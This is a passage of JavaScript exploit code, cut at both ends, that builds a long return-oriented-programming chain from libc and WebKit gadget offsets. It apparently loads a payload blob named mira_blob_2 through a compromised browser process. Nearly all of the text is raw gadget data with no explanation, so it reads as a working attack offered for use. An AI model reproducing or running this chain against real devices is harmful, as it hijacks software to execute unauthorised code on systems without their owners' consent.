ropchain+162496,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+162448,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+162480,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+162592,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+162576,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+788575,

ropchain+162696,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+811575,
ropchain+165112,

libc_base+882884,
libc_base+793877
]);
db([4294967272, 4294967295]);
set_gadgets([
libc_base+248252,

libc_base+793877,
ropchain+162768,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([16, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+162872,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+162888,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+270096,
libc_base+793877,
ropchain+163048,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+163000,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+163016,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([24, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+877546,
libc_base+793877,
ropchain+163104,
webkit_base+7438103,
libc_base+50775,
libc_base+206806
]);

db([0, 0]);
set_gadgets([
libc_base+523896,
libc_base+793877,
ropchain+163208,
webkit_base+7438103,
libc_base+793877,
ropchain+163240,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+163224,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+163400,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+163352,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+163368,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([24, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+877546,
libc_base+793877,
ropchain+163456,
webkit_base+7438103,
libc_base+50775,
libc_base+206806
]);

db([0, 0]);
set_gadgets([
libc_base+523896,
libc_base+793877,
ropchain+163560,
webkit_base+7438103,
libc_base+793877,
ropchain+163592,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+163576,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+163664,
webkit_base+7438103,
libc_base+793877,
ropchain+163680,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+163840,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+163792,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+163808,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([24, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+877546,
libc_base+793877,
ropchain+163896,
webkit_base+7438103,
libc_base+50775,
libc_base+206806
]);

db([0, 0]);
set_gadgets([
libc_base+523896,
libc_base+793877,
ropchain+164000,
webkit_base+7438103,
libc_base+793877,
ropchain+164032,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+164016,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+164128,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+164112,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+164264,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+164248,
webkit_base+7438103,
libc_base+206806,

ropchain+128,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+164408,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+164376,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+164392,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+164496,
webkit_base+7438103,
libc_base+793877
]);

db([1, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+164544,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+788575,

ropchain+128,
webkit_base+2997875,
libc_base+793877,
ropchain+164616,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+164696,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+164752,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
webkit_base+865136,
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+164880,
webkit_base+7438103,
libc_base+759626,
libc_base+793877,
ropchain+164864,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+164976,
webkit_base+7438103,
libc_base+793877,
ropchain+164992,
webkit_base+7438103,
webkit_base+432898
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+165104,
webkit_base+7438103,
libc_base+793877,
ropchain+165088,
webkit_base+7438103,
libc_base+788575
]);

db([0, 0]);
set_gadget(libc_base+811575,);

db([0, 0]);

set_gadget(libc_base+793877,);
db([208, 0]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+206806,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+793877,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+105267,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+792472,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+432898,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+10235455,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+785193,
libc_base+471355,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+11,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+11,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+793877,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
webkit_base+7438103,
libc_base+471355,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+792472,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+206806,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+432898,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+811575,
libc_base+471355,
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([208, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967080, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([200, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967088, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([192, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967096, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([184, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967104, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([176, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967112, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([168, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967272, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+792472
]);
db([4294967280, 4294967295]);
set_gadgets([
webkit_base+5202439,
libc_base+792472,
write_addr,
webkit_base+2997875,
libc_base+793877
]);
db([4294967192, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+793877
]);
db([48, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+759626,
libc_base+471355,
libc_base+793877
]);
db([32, 0]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+793877
]);
db([24, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([128, 0]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+793877,
ropchain+166432,
webkit_base+7438103,
libc_base+811575
]);

db([0, 0]);

set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+166504,
webkit_base+7438103,
libc_base+759626,
webkit_base+432898
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+759626,
libc_base+793877,
ropchain+166608,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+166624,
webkit_base+7438103,
libc_base+793877
]);

db([16, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(webkit_base+432898,);

db([0, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+166712,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+166728,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+166848,
webkit_base+7438103,
libc_base+793877,
ropchain+166864,
webkit_base+7438103,
libc_base+759626,
libc_base+793877,
ropchain+166832,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+166960,
webkit_base+7438103,
libc_base+793877,
ropchain+166976,
webkit_base+7438103,
webkit_base+432898
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+167088,
webkit_base+7438103,
libc_base+793877,
ropchain+167072,
webkit_base+7438103,
libc_base+788575
]);

db([0, 0]);
set_gadget(libc_base+811575,);

db([0, 0]);
set_gadgets([
libc_base+793877,
ropchain+167176,
webkit_base+7438103,
libc_base+759626,
libc_base+793877,
ropchain+167160,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+167272,
webkit_base+7438103,
libc_base+793877,
ropchain+167288,
webkit_base+7438103,
webkit_base+432898
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+167400,
webkit_base+7438103,
libc_base+793877,
ropchain+167384,
webkit_base+7438103,
libc_base+788575
]);

db([0, 0]);
set_gadget(libc_base+811575,);

db([0, 0]);

set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+167472,
webkit_base+7438103,
libc_base+759626,
webkit_base+432898
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+759626,
libc_base+793877,
ropchain+167576,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+167592,
webkit_base+7438103,
libc_base+793877
]);

db([16, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(webkit_base+432898,);

db([0, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+167680,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+167696,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191169,
libc_base+793877,
ropchain+167848,
webkit_base+7438103,
libc_base+793877,
ropchain+167880,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+167832,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+167864,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+168040,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+167992,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+168008,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([32, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+877546,
libc_base+877568,
libc_base+793877,
ropchain+168168,
webkit_base+7438103,
libc_base+793877,
ropchain+168184,
webkit_base+7438103,
libc_base+759626,
libc_base+793877,
ropchain+168152,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+168280,
webkit_base+7438103,
libc_base+793877,
ropchain+168296,
webkit_base+7438103,
webkit_base+432898
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+168408,
webkit_base+7438103,
libc_base+793877,
ropchain+168392,
webkit_base+7438103,
libc_base+788575
]);

db([0, 0]);
set_gadget(libc_base+811575,);

db([0, 0]);
set_gadgets([
libc_base+793877,
ropchain+168496,
webkit_base+7438103,
libc_base+759626,
libc_base+793877,
ropchain+168480,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+168592,
webkit_base+7438103,
libc_base+793877,
ropchain+168608,
webkit_base+7438103,
webkit_base+432898
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+168720,
webkit_base+7438103,
libc_base+793877,
ropchain+168704,
webkit_base+7438103,
libc_base+788575
]);

db([0, 0]);
set_gadget(libc_base+811575,);

db([0, 0]);

set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+168792,
webkit_base+7438103,
libc_base+759626,
webkit_base+432898
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+759626,
libc_base+793877,
ropchain+168896,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+168912,
webkit_base+7438103,
libc_base+793877
]);

db([16, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(webkit_base+432898,);

db([0, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+169000,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+169016,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+270800,
libc_base+793877,
ropchain+169176,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+169128,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+169144,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([16, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+877546,
libc_base+793877,
ropchain+169232,
webkit_base+7438103,
libc_base+50775,
libc_base+206806
]);

db([0, 0]);
set_gadgets([
libc_base+523896,
libc_base+793877,
ropchain+169336,
webkit_base+7438103,
libc_base+793877,
ropchain+169368,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+169352,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+169528,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+169480,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+169496,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([48, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+877546,
libc_base+877568,
libc_base+793877,
ropchain+169632,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+169616,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+792472
]);

db([8, 0]);
set_gadget(libc_base+788575,);

db([8, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+877546,
libc_base+793877,
ropchain+169840,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+169808,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([48, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+877546,
libc_base+877568,
libc_base+793877,
ropchain+169944,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+169928,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+170024,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([16, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+170128,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+170144,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+270800,
libc_base+793877,
ropchain+170304,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+170256,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+170272,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([16, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+877546,
libc_base+793877,
ropchain+170360,
webkit_base+7438103,
libc_base+50775,
libc_base+206806
]);

db([0, 0]);
set_gadgets([
libc_base+523896,
libc_base+793877,
ropchain+170464,
webkit_base+7438103,
libc_base+793877,
ropchain+170496,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+170480,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+170656,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+170608,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+170624,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([48, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+877546,
libc_base+877568,
libc_base+793877,
ropchain+170760,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+170744,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+792472
]);

db([8, 0]);
set_gadget(libc_base+788575,);

db([8, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+170960,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+170928,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([32, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+877546,
libc_base+877568,
libc_base+793877,
ropchain+171064,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+171048,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+877568,
libc_base+793877,
ropchain+171176,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+171144,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([48, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+877546,
libc_base+877568,
libc_base+793877,
ropchain+171240,
webkit_base+7438103,
webkit_base+1786005,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+171296,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+75236,
libc_base+793877,
ropchain+171440,
webkit_base+7438103,
libc_base+793877,
ropchain+171456,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+171424,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+171616,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+171568,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+171584,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([48, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+877546,
libc_base+877568,
libc_base+793877,
ropchain+171744,
webkit_base+7438103,
libc_base+793877,
ropchain+171760,
webkit_base+7438103,
libc_base+759626,
libc_base+793877,
ropchain+171728,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+171856,
webkit_base+7438103,
libc_base+793877,
ropchain+171872,
webkit_base+7438103,
webkit_base+432898
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+171984,
webkit_base+7438103,
libc_base+793877,
ropchain+171968,
webkit_base+7438103,
libc_base+788575
]);

db([0, 0]);
set_gadget(libc_base+811575,);

db([0, 0]);
set_gadgets([
libc_base+793877,
ropchain+172072,
webkit_base+7438103,
libc_base+759626,
libc_base+793877,
ropchain+172056,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+172168,
webkit_base+7438103,
libc_base+793877,
ropchain+172184,
webkit_base+7438103,
webkit_base+432898
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+172296,
webkit_base+7438103,
libc_base+793877,
ropchain+172280,
webkit_base+7438103,
libc_base+788575
]);

db([0, 0]);
set_gadget(libc_base+811575,);

db([0, 0]);

set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+172368,
webkit_base+7438103,
libc_base+759626,
webkit_base+432898
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+50775,
libc_base+793877,
ropchain+172432,
webkit_base+7438103,
libc_base+759626,
webkit_base+432898
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([48, 0]);
set_gadgets([
libc_base+248252,
libc_base+759626,
libc_base+792472,

(window.mira_blob_2||0),
libc_base+793877
]);

db([4294967288, 4294967295]);
set_gadgets([
libc_base+547636,
webkit_base+2997875,
libc_base+759626,
libc_base+792472,

(window.mira_blob_2_len||0),
libc_base+793877
]);

db([4294967284, 4294967295]);
set_gadgets([
libc_base+547636,
webkit_base+954100,
libc_base+759626,
libc_base+793877
]);

db([4294967288, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+172680,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+172696,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+172856,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+172808,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+172840,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+11676600,
libc_base+269973,
libc_base+793877,
ropchain+172984,
webkit_base+7438103,
libc_base+793877,
ropchain+173000,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+172968,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+173104,
webkit_base+7438103,
libc_base+793877,
ropchain+173152,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+173120,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
